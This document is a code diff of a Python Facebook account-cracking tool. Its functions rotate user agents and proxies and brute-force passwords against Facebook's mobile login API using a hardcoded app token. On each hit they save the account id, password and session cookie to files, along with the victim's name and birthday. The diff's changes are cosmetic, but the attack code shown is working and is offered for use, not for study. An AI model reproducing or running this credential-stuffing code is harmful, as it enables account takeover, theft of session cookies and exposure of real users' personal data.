 						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
 						x = json.loads(xn.text)
 						ttl = x['birthday']
-						nama_ = x ji["name"]
-						print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
+						nama_ = x["name"]
+						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
 						print("\r %s*--> %s "%(H,kuki))
 						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 						ok+=1
@@ -1096,7 +1130,7 @@ def free(uiz,pwr):
 					except(KeyError, IOError):
 						ttl = " "
 					except:pass
-					print("\r %s*--> %s|%s "%(H,uiz,pw))
+					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -1107,15 +1141,15 @@ def free(uiz,pwr):
 				continue
 		except requests.exceptions.ConnectionError:
 			turu(31)
-	loop+=1
+	HikmatXD+=1
 
 def api(uiz,pwr):
-	global ok,cp,loop
+	global ok,cp,HikmatXD
 	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
 	ua = random.choice(ua_crack)
 	ses = requests.Session()
 	runc= random.choice([K,M,U,O,B,H])
-	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),loop,H,ok,K,cp)); sys.stdout.flush()
+	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
 	for pw in pwr:
 		pw = pw.lower()
 		proxff= open('proxy_mat.txt','r').read().splitlines()
@@ -1125,7 +1159,7 @@ def api(uiz,pwr):
 		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers,proxies=proxs) 
 		if "session_key" in response.text and "EAAG" in response.text:
 			if "no" in tampilkan_ttl:
-				print("\r %s*--> %s|%s "%(H,uiz,pw))
+				print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
 				open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+'\n')
 				ok+=1
 				break
@@ -1139,20 +1173,20 @@ def api(uiz,pwr):
 					ttl = x['birthday']
 					nama_ = x["name"]
 						#id_ = x["id"]
-					print("\r %s*--> %s|%s|%s|%s "%(H,nama_,uiz,pw,ttl))
+					print("\r %s*--> %s|%s|%s|%s • %s"%(H,nama_,uiz,pw,ttl,tahun(uiz)))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
 					break
 				except(KeyError, IOError):
 					ttl = " "
 				except:pass
-				print("\r %s*--> %s|%s "%(H,uiz,pw))
+				print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
 				open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
 				ok+=1
 			else:continue
 			break
 		elif "www.facebook.com" in response.json()["error_msg"]:
 			if "no" in tampilkan_ttl:
-				print("\r %s*--> %s|%s "%(K,uiz,pw))
+				print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 				open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
 				cp+=1
 				break
@@ -1166,13 +1200,13 @@ def api(uiz,pwr):
 					ttl = x['birthday']
 					nama_ = x["name"]
 						#id_ = x["id"]
-					print("\r %s*--> %s|%s|%s|%s "%(K,nama_,uiz,pw,ttl))
+					print("\r %s*--> %s|%s|%s|%s • %s"%(K,nama_,uiz,pw,ttl,tahun(uiz)))
 					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 					break
 				except(KeyError, IOError):
 					ttl = " "
 				except:pass
-				print("\r %s*--> %s|%s "%(K,uiz,pw))
+				print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
 				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 				cp+=1
 			else:continue
@@ -1180,6 +1214,6 @@ def api(uiz,pwr):
 		else:
 			continue
 	
-	loop +=1
+	HikmatXD +=1
 
 cek_cookie()
